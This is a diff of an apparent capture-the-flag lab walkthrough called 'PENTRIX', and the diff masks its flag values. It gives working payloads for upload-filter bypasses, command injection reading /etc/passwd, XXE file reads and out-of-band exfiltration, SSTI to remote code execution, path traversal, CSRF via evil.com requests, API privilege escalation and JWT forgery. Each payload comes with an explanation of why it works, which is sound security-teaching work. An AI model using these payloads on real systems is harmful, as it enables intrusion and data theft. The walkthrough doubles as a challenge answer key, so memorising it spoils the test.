@@ -837,14 +839,14 @@ printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
 ```
 
 `evil.s.svgvg` minus one occurrence of `.svg` becomes `evil.svg`; the file is
-stored under that name and the flag `PENTRIX{upload_upload-strip-once}` is
+stored under that name and the flag `PENTRIX{...}` is
 awarded. `/upload/view/evil.svg` serves it as `image/svg+xml`.
 
 Why it works: the filter runs only once, so nesting the banned string inside
 itself (`.s.svgvg` -> `.svg`) reconstructs the dangerous extension after the
 single strip.
 
-**9. Avatar overwrite** – `PENTRIX{upload_upload-overwrite}`
+**9. Avatar overwrite** – `PENTRIX{...}`
 
 `/upload/avatar` stores files at predictable paths (`avatar-<user>.png`) and
 never checks that the uploader owns the target user. Overwrite bob's avatar:
@@ -855,7 +857,7 @@ printf 'ATTACKER-BYTES' \
 ```
 
 Since bob's avatar bytes changed from the original, the flag
-`PENTRIX{upload_upload-overwrite}` is awarded. Verify the victim URL now
+`PENTRIX{...}` is awarded. Verify the victim URL now
 serves attacker content:
 
 ```bash
@@ -866,7 +868,7 @@ Why it works: predictable filenames plus no ownership check let anyone write
 any user's file, and the serve path even sniffs content, rendering an HTML
 replacement as a page.
 
-**10. GIF/HTML polyglot** – `PENTRIX{upload_upload-polyglot}`
+**10. GIF/HTML polyglot** – `PENTRIX{...}`
 
 `/upload/polyglot` "validates" images by checking only the first 6 magic
 bytes, then `/upload/poly/:name` serves the file as `text/html`. A file can
@@ -878,7 +880,7 @@ printf 'GIF89a<script>alert(1)</script>' \
 ```
 
 The magic bytes pass, the scriptable HTML survives, and the flag
-`PENTRIX{upload_upload-polyglot}` is awarded. Fetching
+`PENTRIX{...}` is awarded. Fetching
 `/upload/poly/x.gif` returns `Content-Type: text/html` with
 `GIF89a<script>alert(1)</script>` intact, so the browser executes it.
 
@@ -889,14 +891,14 @@ polyglot that is both a GIF header and a script.
 
 ## cmdi – Command Injection
 
-**1. Ping gadget** – `PENTRIX{cmdi_basic}`
+**1. Ping gadget** – `PENTRIX{...}`
 Your input is concatenated into a shell command with zero filtering:
 ```
 GET /cmdi/ping?host=127.0.0.1;id
 ```
 Why it works: `;` ends the `ping` command and starts yours. The server runs it with its own privileges.
 
-**2. Filter bypass** – `PENTRIX{cmdi_bypass}`
+**2. Filter bypass** – `PENTRIX{...}`
 v2 strips `;`, once. Shells offer other chaining operators:
 ```
 GET /cmdi/ping2?host=127.0.0.1%26%26id
@@ -906,7 +908,7 @@ Why it works: removing one bad character is not sanitization. Never build shell 
 
 ---
 
-**3. Ping Gadget v3 (spaces stripped)** - `PENTRIX{cmdi_cmdi-ifs}`
+**3. Ping Gadget v3 (spaces stripped)** - `PENTRIX{...}`
 
 Request:
 
@@ -922,7 +924,7 @@ the flag is awarded.
 Why it works: the blacklist removes spaces but the shell still expands `$IFS` into a
 word separator at run time.
 
-**4. Ping Gadget v4 ($IFS blocked too)** - `PENTRIX{cmdi_cmdi-braces}`
+**4. Ping Gadget v4 ($IFS blocked too)** - `PENTRIX{...}`
 
 Request (note: `{` and `}` must be URL-encoded as `%7B`/`%7D`, `$` as `%24`):
 
@@ -937,7 +939,7 @@ sees `cat /etc/passwd`.
 Why it works: string-matching filters do not understand shell syntax, and `${IFS}`
 expands exactly like `$IFS`.
 
-**5. Ping Gadget v5 (separators blocked)** - `PENTRIX{cmdi_cmdi-newline}`
+**5. Ping Gadget v5 (separators blocked)** - `PENTRIX{...}`
 
 Request (`%0a` is a URL-encoded newline):
 
@@ -952,7 +954,7 @@ both. The output shows `root:` and the flag is awarded.
 Why it works: the blacklist forgot that newline is a command separator, and the
 value is placed into the command unquoted.
 
-**6. Ping Gadget v6 ($() blocked)** - `PENTRIX{cmdi_cmdi-backtick}`
+**6. Ping Gadget v6 ($() blocked)** - `PENTRIX{...}`
 
 Request:
 
@@ -967,7 +969,7 @@ output (`uid=...`) is echoed.
 Why it works: the filter blocks one command-substitution syntax but the shell honors
 two.
 
-**7. Ping Gadget v7 (cat and / blocked)** - `PENTRIX{cmdi_cmdi-wildcard}`
+**7. Ping Gadget v7 (cat and / blocked)** - `PENTRIX{...}`
 
 Request (`?` encoded as `%3F`, space as `%20`):
 
@@ -983,7 +985,7 @@ is ever typed. The output contains `root:` and the flag is awarded.
 Why it works: the blacklist matches literal words, but glob wildcards let the shell
 itself rebuild the blocked words during pathname expansion.
 
-**8. Ping Gadget v8 (; blocked)** - `PENTRIX{cmdi_cmdi-pipe}`
+**8. Ping Gadget v8 (; blocked)** - `PENTRIX{...}`
 
 Request:
 
@@ -997,7 +999,7 @@ runs, its output is piped into `id`, and `id` prints `uid=...`.
 Why it works: `|` is a command separator the single-character blacklist never
 considered.
 
-**9. Ping Gadget v9 (spaces blocked, again)** - `PENTRIX{cmdi_cmdi-tab}`
+**9. Ping Gadget v9 (spaces blocked, again)** - `PENTRIX{...}`
 
 Request (`%09` is a URL-encoded tab):
 
@@ -1011,7 +1013,7 @@ Spaces are stripped, but a literal tab is also shell whitespace. The shell sees
 Why it works: the filter blocks one whitespace character while the shell accepts
 several (space, tab, newline).
 
-**10. Ping Gadget v10 (metachars blocked, unquoted)** - `PENTRIX{cmdi_cmdi-env}`
+**10. Ping Gadget v10 (metachars blocked, unquoted)** - `PENTRIX{...}`
 
 Request (`%0a` is a URL-encoded newline):
 
@@ -1030,7 +1032,7 @@ separator this one missed.
 
 ## xxe – XML External Entity Injection
 
-**1. XXE file read** – `PENTRIX{xxe_file}`
+**1. XXE file read** – `PENTRIX{...}`
 The XML importer resolves external entities. Declare one pointing at a local file:
 ```xml
 <?xml version="1.0"?>
@@ -1042,12 +1044,12 @@ POST /xxe/import   (form field: xml)
 ```
 Why it works: the parser fetches `file://` URIs and substitutes the file contents into the document.
 
-**2. SSRF via XXE** – `PENTRIX{xxe_ssrf}`
+**2. SSRF via XXE** – `PENTRIX{...}`
 The same entity expander also fetches `http://` URLs. Point the entity at the SSRF module's internal secret endpoint and chain XXE into SSRF. Same request shape as above with an `http://` SYSTEM URI.
 
 ---
 
-**3. Billion Laughs (Entity-Expansion DoS)** - `PENTRIX{xxe_xxe-billion-laughs}`
+**3. Billion Laughs (Entity-Expansion DoS)** - `PENTRIX{...}`
 
 Request (use `--data-urlencode` so the `&` characters survive):
 
@@ -1066,7 +1068,7 @@ passes 5 MB, which de-flakes fast hardware). Verified: 16,111,259 chars expanded
 Why it works: recursive entity expansion is exponential, and nothing caps the
 recursion depth or total output.
 
-**4. External DTD Exfiltration** - `PENTRIX{xxe_xxe-external-dtd}`
+**4. External DTD Exfiltration** - `PENTRIX{...}`
 
 Step 1 - host the malicious DTD on the in-lab collector:
 
@@ -1092,7 +1094,7 @@ DTD template with the correct absolute path and port.)
 Why it works: external DTDs are fetched and their parameter entities are honored, so
 a DTD can turn a file read into a server-side request carrying the file content.
 
-**5. XXE in Uploaded SVG** - `PENTRIX{xxe_xxe-svg}`
+**5. XXE in Uploaded SVG** - `PENTRIX{...}`
 
 Request:
 
@@ -1108,7 +1110,7 @@ entity is resolved, and the secret appears in the extracted text.
 Why it works: the "parser" expands external entities on any XML it is handed,
 including uploaded SVGs.
 
-**6. XInclude File Inclusion** - `PENTRIX{xxe_xxe-xinclude}`
+**6. XInclude File Inclusion** - `PENTRIX{...}`
 
 Request:
 
@@ -1124,7 +1126,7 @@ document and shown in the output.
 Why it works: `xi:include` hrefs are fetched server-side with no allowlist, which is
 XXE by another name.
 
-**7. Parameter-Entity OOB Exfiltration** - `PENTRIX{xxe_xxe-param-oob}`
+**7. Parameter-Entity OOB Exfiltration** - `PENTRIX{...}`
 
 Request (single quotes around the inner URL are required):
 
@@ -1148,7 +1150,7 @@ Why it works: parameter entities are expanded inside the doctype, so an attacker
 declare new external entities at parse time and pivot a file read into an
 out-of-band request.
 
-**8. XXE in SOAP Endpoint** - `PENTRIX{xxe_xxe-soap}`
+**8. XXE in SOAP Endpoint** - `PENTRIX{...}`
 
 Request:
 
@@ -1167,14 +1169,14 @@ Why it works: every XML entry point shares the vulnerable parser, so the classic
 
 ## ssti – Server-Side Template Injection
 
-**1. Basic SSTI** – `PENTRIX{ssti_basic}`
+**1. Basic SSTI** – `PENTRIX{...}`
 Your name is dropped into a template that gets evaluated:
 ```
 GET /ssti/greet?name={{7*7}}
 ```
 The page answers "Hello 49!", proving server-side evaluation.
 
-**2. SSTI to RCE** – `PENTRIX{ssti_rce}`
+**2. SSTI to RCE** – `PENTRIX{...}`
 Once template syntax evaluates, reach for the engine's internals (objects, attributes, subclasses) to break out of the sandbox and run OS commands or read the flag variable the challenge exposes:
 ```
 GET /ssti/greet?name={{secretFlag}}
@@ -1183,7 +1185,7 @@ Why it works: templates are code. Rendering user input as template source hands 
 
 ---
 
-**3. Template Injection on a Second Endpoint** - `PENTRIX{ssti_ssti-echo2}`
+**3. Template Injection on a Second Endpoint** - `PENTRIX{...}`
 
 Request:
 
@@ -1197,7 +1199,7 @@ to 49 in the invitation card.
 Why it works: the template engine evaluates anything inside `{{ }}` as server-side
 code.
 
-**4. Word Blacklist Bypass** - `PENTRIX{ssti_ssti-wordfilter}`
+**4. Word Blacklist Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1213,7 +1215,7 @@ the nested `eval()` reassembles it at run time and reads the in-scope variable.
 Why it works: the blacklist is plain substring matching, and string concatenation
 plus a nested `eval()` rebuilds the blocked identifier after filtering.
 
-**5. Underscore Blacklist Bypass** - `PENTRIX{ssti_ssti-nounderscore}`
+**5. Underscore Blacklist Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1228,7 +1230,7 @@ Underscores are deleted, so `{{db_pass}}` becomes `{{dbpass}}`. Character code 9
 Why it works: the filter removes a character the attacker can regenerate from its
 character code.
 
-**6. Bracket Blacklist Bypass** - `PENTRIX{ssti_ssti-nobrackets}`
+**6. Bracket Blacklist Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1244,7 +1246,7 @@ no brackets at all.
 Why it works: when indexing is impossible, serializing the entire object leaks every
 property.
 
-**7. Dot Blacklist Bypass** - `PENTRIX{ssti_ssti-dotblock}`
+**7. Dot Blacklist Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1257,7 +1259,7 @@ bracket notation (`db["key"]`) accesses the same property with no dots.
 
 Why it works: property access has two syntaxes, and the filter only blocks one.
 
-**8. Curly-Brace Strip Bypass** - `PENTRIX{ssti_ssti-curly}`
+**8. Curly-Brace Strip Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1271,7 +1273,7 @@ semicolon filter in the cmdi module). Sending doubled braces leaves one working
 
 Why it works: a strip-once filter is defeated by doubling the stripped sequence.
 
-**9. Quote Blacklist Bypass** - `PENTRIX{ssti_ssti-noquotes}`
+**9. Quote Blacklist Bypass** - `PENTRIX{...}`
 
 Request:
 
@@ -1287,7 +1289,7 @@ no blocked word; the nested `eval()` turns it back into the identifier.
 Why it works: any string can be rebuilt from character codes, and a nested `eval()`
 evaluates the rebuilt identifier in the template scope.
 
-**10. SSTI to Remote Code Execution** - `PENTRIX{ssti_ssti-rce}`
+**10. SSTI to Remote Code Execution** - `PENTRIX{...}`
 
 Request:
 
@@ -1305,14 +1307,14 @@ escalates directly to RCE via `require("child_process")`.
 
 ## lfi – Path Traversal
 
-**1. Basic traversal** – `PENTRIX{lfi_traversal}`
+**1. Basic traversal** – `PENTRIX{...}`
 The `file` parameter is used as a filesystem path with no checks:
 ```
 GET /lfi/view?file=..%2Fdocs%2Fsecret.txt
 ```
 Why it works: `../` climbs out of the intended directory.
 
-**2. Filter bypass** – `PENTRIX{lfi_filter-bypass}`
+**2. Filter bypass** – `PENTRIX{...}`
 The download endpoint strips `../` exactly once. Nest the sequences so the strip creates a new one:
 ```
 GET /lfi/download?file=....%2F%2Fdocs%2Fsecret.txt
@@ -1322,43 +1324,43 @@ Why it works: single-pass sanitization is undone by its own removal. Canonicaliz
 
 ---
 
-**3. Absolute Path Read** - `PENTRIX{lfi_absolute}`
+**3. Absolute Path Read** - `PENTRIX{...}`
 Request: `GET /lfi/abs?page=/etc/passwd`
 The page prints `/etc/passwd` (look for `root:x:0:0`) and the flag box appears.
 Why it works: the reader uses absolute paths verbatim instead of confining reads to the docs folder, so no `../` traversal is needed at all.
 
-**4. Double-Encoding Bypass** - `PENTRIX{lfi_double-encode}`
+**4. Double-Encoding Bypass** - `PENTRIX{...}`
 Request: `GET /lfi/double?page=%252e%252e%252fdocs%252fsecret.txt`
 The filter decodes once, sees no `..`, and lets it through; the value is decoded a second time on use, becoming `../docs/secret.txt`, and the secret (`LFI-SECRET-8830`) is printed with the flag.
 Why it works: single-decode-then-check is defeated when the application decodes again after the check; `%252e` survives the first decode as `%2e` and becomes `.` on the second.
 
-**5. Deep Nesting Bypass** - `PENTRIX{lfi_nested-deep}`
+**5. Deep Nesting Bypass** - `PENTRIX{...}`
 Request: `GET /lfi/nested?page=....///docs/secret.txt`
 The filter strips every `../` in one pass, turning `....///` into `..//`, which normalizes to `../`; the secret is printed with the flag. (`...//docs/secret.txt` works too.)
 Why it works: a one-pass strip never re-inspects its own output, so nested dots regenerate a fresh traversal sequence after filtering.
 
-**6. Language Parameter Traversal** - `PENTRIX{lfi_lang}`
+**6. Language Parameter Traversal** - `PENTRIX{...}`
 Request: `GET /lfi/lang?lang=../secret`
 The viewer reads `docs/lang/../secret.txt`, which resolves to `docs/secret.txt`; the secret is printed with the flag.
 Why it works: the `lang` parameter is concatenated into a filesystem path with zero validation, so it is just another filename input.
 
-**7. Log Poisoning Chain** - `PENTRIX{lfi_log-poison}`
+**7. Log Poisoning Chain** - `PENTRIX{...}`
 Step 1, poison the log: `curl -A "PENTRIX-LOG-MARKER pwned" http://localhost:3000/lfi/log-demo`
 Step 2, read the log back through the LFI: `GET /lfi/view?file=../lfi_access.log`
 Your marker appears in the file content returned by the viewer, and the flag is awarded.
 Why it works: the access log stores the raw User-Agent with no filtering (log injection), and the document viewer reads that log file via traversal, chaining the two flaws.
 
-**8. Process Environ Leak** - `PENTRIX{lfi_proc-self}`
+**8. Process Environ Leak** - `PENTRIX{...}`
 Request: `GET /lfi/procinfo?f=environ`
 The page prints the raw `/proc/self/environ` (NUL-separated `KEY=value` entries, including `PATH=`) and the flag is awarded.
 Why it works: the filename is appended to `/proc/self/` with no validation, and `environ` exposes the whole process environment, secrets included.
 
-**9. Encoded Separator Bypass** - `PENTRIX{lfi_enc-slash}`
+**9. Encoded Separator Bypass** - `PENTRIX{...}`
 Request: `GET /lfi/enc?page=%2e%2e%2fdocs%2fsecret.txt`
 The filter rejects literal `..` and `/` but checks before decoding; `%2e%2e%2f` passes the check and decodes to `../` afterwards. The secret is printed with the flag.
 Why it works: validating the still-encoded input is useless once a decode happens after the check.
 
-**10. Secret Config Read** - `PENTRIX{lfi_config-read}`
+**10. Secret Config Read** - `PENTRIX{...}`
 Request: `GET /lfi/config?file=../lfi_secret.conf`
 The planted config one directory above docs is printed (contains `LFI-CONFIG-SECRET-5521`) and the flag is awarded.
 Why it works: the config viewer applies no validation at all, and a secret file was left within traversal reach.
@@ -1366,21 +1368,21 @@ Why it works: the config viewer applies no validation at all, and a secret file 
 
 ## csrf – Cross-Site Request Forgery
 
-**1. State-changing GET** – `PENTRIX{csrf_email}`
+**1. State-changing GET** – `PENTRIX{...}`
 Log in (`GET /csrf/login/alice`), then note the email change needs no token and rides on your session cookie:
 ```
 GET /csrf/change-email?email=pwned@evil.com
 ```
 In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it.
 
-**2. Open redirect** – `PENTRIX{csrf_redirect}`
+**2. Open redirect** – `PENTRIX{...}`
 ```
 GET /csrf/go?to=https://evil.com
 ```
 The server 302-redirects to any external URL. Attackers use this for phishing ("this link really goes to our site, look at the domain").
 Why it works: the `to` parameter is never validated against an allowlist.
 
-**3. Clickjacking** – `PENTRIX{csrf_clickjacking}`
+**3. Clickjacking** – `PENTRIX{...}`
 ```
 GET /csrf/framedemo
 ```
@@ -1389,54 +1391,54 @@ Why it works: without framing defenses, your authenticated page becomes a puppet
 
 ---
 
-**4. JSON API CSRF via text/plain (simple request)** – `PENTRIX{csrf_json-csrf}`
+**4. JSON API CSRF via text/plain (simple request)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/json-email` and submit the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`).
    Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}' /csrf/api/email`
 3. The email changes and the flag is awarded.
 Why it works: the endpoint mines text/plain bodies for a JSON object and has no CSRF token; a `text/plain` form is a CORS simple request, so no preflight blocks the forged cross-site call and cookies are attached.
 
-**5. Login CSRF (forged session switch)** – `PENTRIX{csrf_login-csrf}`
+**5. Login CSRF (forged session switch)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice` (you are alice).
 2. Visit `/csrf/attacker-login` ("totally legit site"). Its hidden form auto-submits `POST /csrf/login` with `username=mallory`.
 3. Your session user switches to mallory and the flag is awarded.
 Why it works: the login endpoint performs the state-changing session switch with no CSRF token, so any third-party page can log the victim into an attacker-chosen account.
 
-**6. Password Change via multipart/form-data (no token)** – `PENTRIX{csrf_multipart-csrf}`
+**6. Password Change via multipart/form-data (no token)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/password-multipart` and submit the form (it uses `enctype="multipart/form-data"`).
    Equivalent curl: `curl -b cookies -X POST -F "password=hacked123" /csrf/api/password-multipart`
 3. The password changes and the flag is awarded.
 Why it works: the endpoint parses multipart bodies and checks no CSRF token; multipart is just a body format any cross-site form can use, and it needs no preflight.
 
-**7. Weak Referer Check Bypass** – `PENTRIX{csrf_referer-bypass}`
+**7. Weak Referer Check Bypass** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Send the nickname change with a forged Referer:
    `curl -b cookies -X POST -H "Referer: https://evil.com/?pentrix.lab" -d "nickname=pwned" /csrf/api/nickname`
 3. The nickname changes and the flag is awarded (a missing or non-matching referer gets 403).
 Why it works: the check is `referer.includes('pentrix.lab')`, and the attacker fully controls the referer sent from their own page, so `https://evil.com/?pentrix.lab` contains the magic substring.
 
-**8. Password Change via GET (no token)** – `PENTRIX{csrf_get-passwd-change}`
+**8. Password Change via GET (no token)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/change-password?password=hacked123` (or click the simulated attacker link on the challenge page).
 3. The password changes and the flag is awarded.
 Why it works: the password change is a state-changing GET with no CSRF token, so a forged link or `<img>` tag on any third-party page triggers it with the victim's cookies.
 
-**9. Content-Type Confusion on a JSON API** – `PENTRIX{csrf_contenttype-bypass}`
+**9. Content-Type Confusion on a JSON API** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/theme` and submit the plain HTML form (urlencoded) to `POST /csrf/api/theme`.
    Equivalent curl: `curl -b cookies -X POST -d "theme=dark" /csrf/api/theme`
 3. The theme changes and the flag is awarded. (The intended JSON client — `Content-Type: application/json` — also works but earns no flag.)
 Why it works: the developers assumed only JSON clients would call the endpoint, but the urlencoded body parser also populates `req.body`, so a plain cross-site form with no preflight drives the "JSON-only" API.
 
-**10. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{csrf_method-override-csrf}`
+**10. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/account` and submit the form containing the hidden `_method=DELETE` field (a plain POST).
    Equivalent curl: `curl -b cookies -X POST -d "_method=DELETE" /csrf/account`
 3. The delete path triggers and the flag is awarded. (A real `DELETE /csrf/account` also deletes but earns no flag.)
 Why it works: cross-site `DELETE` needs a CORS preflight, but a plain POST does not; the app's manual `_method` override lets the "protected" method ride in on a preflight-free POST.
 
-**11. Disable 2FA via GET Link (no token)** – `PENTRIX{csrf_2fa-disable-get}`
+**11. Disable 2FA via GET Link (no token)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
 2. Open `/csrf/2fa/disable` (the link shown on the `/csrf/2fa` page).
 3. 2FA is disabled and the flag is awarded.
@@ -1445,7 +1447,7 @@ Why it works: disabling two-factor authentication is a security-sensitive state 
 
 ## api – API Security
 
-**1. Mass assignment** – `PENTRIX{api_mass-assignment}`
+**1. Mass assignment** – `PENTRIX{...}`
 Log in (`GET /api/login/alice`), then PATCH your profile with an extra field the API blindly copies:
 ```
 PATCH /api/me
@@ -1453,18 +1455,18 @@ PATCH /api/me
 ```
 Why it works: the update handler merges the whole JSON body into the user object instead of picking allowed fields.
 
-**2. Excessive data exposure** – `PENTRIX{api_exposure}`
+**2. Excessive data exposure** – `PENTRIX{...}`
 ```
 GET /api/users
 ```
 The response includes password hashes, and the flag rides in the `X-Pentrix-Flag` header. APIs must return only what the client needs.
 
-**3. Missing rate limiting** – `PENTRIX{api_rate-limit}`
+**3. Missing rate limiting** – `PENTRIX{...}`
  Hammer the login endpoint: 14 failed attempts, then a correct one on attempt 15 (`alice` / `alice123`). No throttling exists, so credential stuffing is trivially scriptable.
 
 ---
 
-**4. BOLA: Order Access** – `PENTRIX{api_bola-orders}`
+**4. BOLA: Order Access** – `PENTRIX{...}`
 
 `GET /api/v1/orders/:id` trusts the id and never checks ownership:
 
@@ -1479,7 +1481,7 @@ awards the flag.
 Why it works: broken object-level authorization; the endpoint resolves the
 object id without verifying it belongs to the caller.
 
-**5. Mass Assignment: Role** – `PENTRIX{api_mass-assign-role}`
+**5. Mass Assignment: Role** – `PENTRIX{...}`
 
 `PATCH /api/v1/users/:id` builds its SQL SET clause from every key in the JSON
 body, with no allowlist:
@@ -1495,7 +1497,7 @@ The response shows your role flipped to admin and the flag is awarded.
 Why it works: client-controlled keys become columns in the UPDATE, so `role`
 is writable even though no UI ever sends it.
 
-**6. API Key Exposure** – `PENTRIX{api_data-exposure-keys}`
+**6. API Key Exposure** – `PENTRIX{...}`
 
 `GET /api/v1/me` bundles a secret API key into the profile response:
 
@@ -1509,7 +1511,7 @@ client should never see. Fetching it awards the flag.
 Why it works: excessive data exposure; the server serializes internal secrets
 into a client-facing response.
 
-**7. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{api_ratelimit-xff}`
+**7. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{...}`
 
 `POST /api/v1/login` locks an IP out after 3 bad attempts, but the "client IP"
 is read from the `X-Forwarded-For` header, which you control:
@@ -1537,7 +1539,7 @@ a spoofed header.
 Why it works: rate-limit identity comes from a client-controlled header, so the
 attacker gets a fresh quota by spoofing a new IP per attempt.
 
-**8. Unsafe PUT: Read-only Field Overwrite** – `PENTRIX{api_unsafe-put}`
+**8. Unsafe PUT: Read-only Field Overwrite** – `PENTRIX{...}`
 
 `PUT /api/v1/profile` replaces your profile object and copies every key you
 send, including the read-only `is_admin` flag:
@@ -1553,7 +1555,7 @@ The response shows `is_admin: 1` and the flag is awarded.
 Why it works: PUT full-object replacement with no field allowlist lets the
 client overwrite server-managed fields.
 
-**9. API Version AuthZ Bypass** – `PENTRIX{api_api-version-bypass}`
+**9. API Version AuthZ Bypass** – `PENTRIX{...}`
 
 `GET /api/v1/users/:id` enforces "your own record, or admin". The v2 copy
 forgot the check:
@@ -1568,7 +1570,7 @@ The v2 response includes bob's password hash and secret.
 Why it works: the authorization check was not carried over when the endpoint
 was versioned, so the new route exposes what the old one protects.
 
-**10. IDOR: Invoice Enumeration** – `PENTRIX{api_id-enumeration}`
+**10. IDOR: Invoice Enumeration** – `PENTRIX{...}`
 
 Invoice ids are sequential and `GET /api/v1/invoices/:id` does not check
 ownership:
@@ -1581,7 +1583,7 @@ curl -b c.txt http://localhost:3000/api/v1/invoices/2   # someone else's + flag
 Why it works: predictable identifiers plus missing ownership check turn id
 guessing into cross-user data access.
 
-**11. PATCH Self-Privilege Escalation** – `PENTRIX{api_patch-self-admin}`
+**11. PATCH Self-Privilege Escalation** – `PENTRIX{...}`
 
 `PATCH /api/v1/me` is meant for `display_name` and `bio`, but there is no
 allowlist:
@@ -1602,19 +1604,19 @@ record let the client promote itself.
 
 ## misconfig – Security Misconfiguration
 
-**1. Verbose debug errors** – `PENTRIX{misconfig_debug}`
+**1. Verbose debug errors** – `PENTRIX{...}`
 ```
 GET /misconfig/debug?err=1
 ```
 The error page dumps configuration, and the `debugToken` in the dump *is* the flag. Stack traces and config dumps belong in logs, not responses.
 
-**2. Exposed backup file** – `PENTRIX{misconfig_backup}`
+**2. Exposed backup file** – `PENTRIX{...}`
 ```
 GET /misconfig/backup.sql
 ```
 A database backup sits in the web root, served like any static file. It contains the flag (and in real life, credentials).
 
-**3. Directory listing** – `PENTRIX{misconfig_listing}`
+**3. Directory listing** – `PENTRIX{...}`
 ```
 GET /misconfig/files/
 ```
@@ -1624,7 +1626,7 @@ Directory browsing is enabled. The listing reveals `secret.txt`; fetch it for th
 
 *All flags look like `PENTRIX{...}`. If a payload stops working, reset the lab database by deleting `data/vulnlab.db` and restarting the app – some challenges mutate lab state (passwords, roles, emails) by design.*
 
-**4. Exposed .git Directory** - `PENTRIX{misconfig_git}`
+**4. Exposed .git Directory** - `PENTRIX{...}`
 Walk the chain:
 `GET /misconfig/.git/HEAD` gives `ref: refs/heads/main`
 `GET /misconfig/.git/refs/heads/main` gives the commit hash `a1b2c3d4...`
@@ -1632,37 +1634,37 @@ Walk the chain:
 `GET /misconfig/.git/objects/a1/b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4` prints the commit, whose diff leaks `ADMIN_BACKUP_TOKEN`, and the flag is awarded.
 Why it works: version-control metadata served over HTTP lets anyone resolve refs and read objects, and this commit's diff contains a production secret.
 
-**5. Vim Swap File Leak** - `PENTRIX{misconfig_swp}`
+**5. Vim Swap File Leak** - `PENTRIX{...}`
 Request: `GET /misconfig/app.js.swp`
 The recovered editor backup prints dev notes with a database password, a Stripe key, and the backup token flag.
 Why it works: the swap artifact was left in the web-accessible tree and is served to anyone who guesses its name.
 
-**6. HTTP TRACE Enabled (XST)** - `PENTRIX{misconfig_trace}`
+**6. HTTP TRACE Enabled (XST)** - `PENTRIX{...}`
 Request: `curl -X TRACE http://localhost:3000/misconfig/trace -H "X-Custom: hello"`
 The server reflects the full request (your headers come back in the page) and the flag is awarded.
 Why it works: TRACE is enabled and echoes the entire request, which is the primitive behind cross-site tracing attacks that steal reflected `Cookie`/`Authorization` headers.
 
-**7. Exposed .env File** - `PENTRIX{misconfig_env}`
+**7. Exposed .env File** - `PENTRIX{...}`
 Request: `GET /misconfig/.env`
 The file prints `DB_URL`, `STRIPE_SECRET_KEY`, `SESSION_SECRET`, and the admin API token flag.
 Why it works: the environment file with production secrets sits where the web server serves it to anyone who asks.
 
-**8. Debug Mode via Query Param** - `PENTRIX{misconfig_debug-param}`
+**8. Debug Mode via Query Param** - `PENTRIX{...}`
 Request: `GET /misconfig/info?debug=1`
 The page renders a stack trace plus a config dump containing the debug token flag. (Plain `/misconfig/info` shows nothing.)
 Why it works: a query-string switch flips on verbose debug output, leaking internals to any visitor who guesses the parameter.
 
-**9. Default Credentials** - `PENTRIX{misconfig_manager}`
+**9. Default Credentials** - `PENTRIX{...}`
 Request: `curl -u admin:admin http://localhost:3000/misconfig/manager`
 Without credentials the panel returns 401; with `admin:admin` (HTTP Basic) it opens and the flag is awarded.
 Why it works: the management panel is protected only by the vendor default credential, which was never changed.
 
-**10. Robots.txt Disclosure** - `PENTRIX{misconfig_robots}`
+**10. Robots.txt Disclosure** - `PENTRIX{...}`
 `GET /misconfig/robots.txt` shows `Disallow: /misconfig/backup.zip`
 `GET /misconfig/backup.zip` downloads a valid ZIP; `unzip -p backup.zip backup.txt` prints admin credentials and the backup token flag.
 Why it works: robots.txt advertises the sensitive path, and the backup archive itself is downloadable.
 
-**11. Unauthenticated HTTP PUT** - `PENTRIX{misconfig_put}`
+**11. Unauthenticated HTTP PUT** - `PENTRIX{...}`
 Upload: `curl -X PUT -H "Content-Type: text/plain" --data-binary 'hello' http://localhost:3000/misconfig/files/pwn.txt` (201 Created)
 Read back: `GET /misconfig/files/pwn.txt` prints the uploaded bytes and the flag is captured on the scoreboard.
 Why it works: the endpoint accepts arbitrary file writes with no authentication, and the written file is served back raw, proving the write.
@@ -1670,7 +1672,7 @@ Why it works: the endpoint accepts arbitrary file writes with no authentication,
 
 ## jwt – JWT Attacks
 
-**1. alg=none Accepted** – `PENTRIX{jwt_none-admin}`
+**1. alg=none Accepted** – `PENTRIX{...}`
 
 Build an unsigned token by hand. Header `{"alg":"none","typ":"JWT"}` and payload
 `{"user":"guest","role":"admin"}`, base64url-encoded, joined with dots and an
@@ -1688,7 +1690,7 @@ Paste the token into the form at `/jwt/none` and submit.
 Why it works: the verifier treats `alg=none` as legitimate and checks only the
 claims, so a self-written token with `role: admin` is accepted with no signature.
 
-**2. Weak HMAC Secret** – `PENTRIX{jwt_weak-secret}`
+**2. Weak HMAC Secret** – `PENTRIX{...}`
 
 Grab the guest token from `/jwt/weak` and decode it to confirm `alg` is `HS256`.
 The secret is the guessable default `secret123`. Forge an admin token offline:
@@ -1704,7 +1706,7 @@ Submit it at `/jwt/weak`.
 Why it works: HS256 security rests entirely on the secret, and a weak secret can
 be guessed, letting anyone mint validly signed tokens.
 
-**3. SQL Injection in kid Lookup** – `PENTRIX{jwt_kid-sqli}`
+**3. SQL Injection in kid Lookup** – `PENTRIX{...}`
 
 The server runs `SELECT key FROM jwt_keys WHERE kid='<kid from token>'` and
 verifies your token with whatever key comes back. Inject through the `kid`
@@ -1724,7 +1726,7 @@ Submit the token at `/jwt/kid`.
 Why it works: the interpolated `kid` lets you UNION in your own key, so the
